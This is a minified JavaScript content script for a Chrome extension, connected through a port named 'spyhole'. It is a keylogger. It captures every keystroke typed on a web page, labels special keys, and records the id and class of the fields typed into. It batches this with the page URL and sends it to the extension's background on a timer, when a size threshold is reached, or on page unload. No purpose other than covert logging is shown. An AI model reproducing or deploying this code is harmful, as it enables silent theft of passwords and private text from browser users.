var u=window.location.toString().split("/");var conn={port:chrome.runtime.connect({name:"spyhole"}),data:{sendtime:Date.now(),url:u[0]+"://"+u[2],keylog:"",targets:[]},addListener:function(){conn.port.onMessage.addListener(function(e){})},sendData:function(){if(conn.data.keylog.length>0){conn.data.sendtime=Date.now();conn.port.postMessage(conn.data);conn.data.keylog="";conn.data.targets=[]}},addCharCode:function(e){conn.data.keylog+=String.fromCharCode(e)},addString:function(e){conn.data.keylog+=e},addTarget:function(e){var t=conn.getDomString(e);if(conn.data.targets.indexOf(t)==-1)conn.data.targets.push(t)},getDomString:function(e){var t=e.tagName.toLowerCase();var n=e.getAttribute("id");var r=e.getAttribute("class").replace(/ /g,".");t+=n==null?"":"#"+n;t+=r==null?"":"."+r;return t}};var timer={duration:5e3,timeoutID:null,startTimer:function(){timer.timeoutID=window.setTimeout(timer.expireTimer,timer.duration)},expireTimer:function(){conn.sendData();timer.startTimer()},resetTimer:function(){window.clearTimeout(this.timeoutID);timer.startTimer()}};$("body").on("keypress",function(e){conn.addCharCode(e.keyCode);conn.addTarget(e.target);timer.resetTimer();if(conn.data.keylog.length>100||conn.data.targets.length>2){conn.sendData()}});$("body").on("keydown",function(e){switch(e.keyCode){case 8:conn.addString("|BCK");break;case 9:conn.addString("|TAB");break;case 13:conn.addString("|ENT");break;case 16:conn.addString("|SFT");break;case 17:conn.addString("|CTR");break;case 18:conn.addString("|ALT");break;case 20:conn.addString("|CAP");break;case 27:conn.addString("|ESC");break;case 33:conn.addString("|PUP");break;case 34:conn.addString("|PDN");break;case 35:conn.addString("|END");break;case 36:conn.addString("|HOM");break;case 37:conn.addString("|LFT");break;case 38:conn.addString("| UP");break;case 39:conn.addString("|RGT");break;case 40:conn.addString("|DWN");break;case 45:conn.addString("|INS");break;case 46:conn.addString("|DEL");break;case 91:conn.addString("|SUP");break;case 144:conn.addString("|NUM");break;default:break}timer.resetTimer();if(conn.data.keylog.length>100||conn.data.targets.length>2){conn.sendData()}});$(window).unload(function(){conn.sendData()});conn.addListener();timer.startTimer()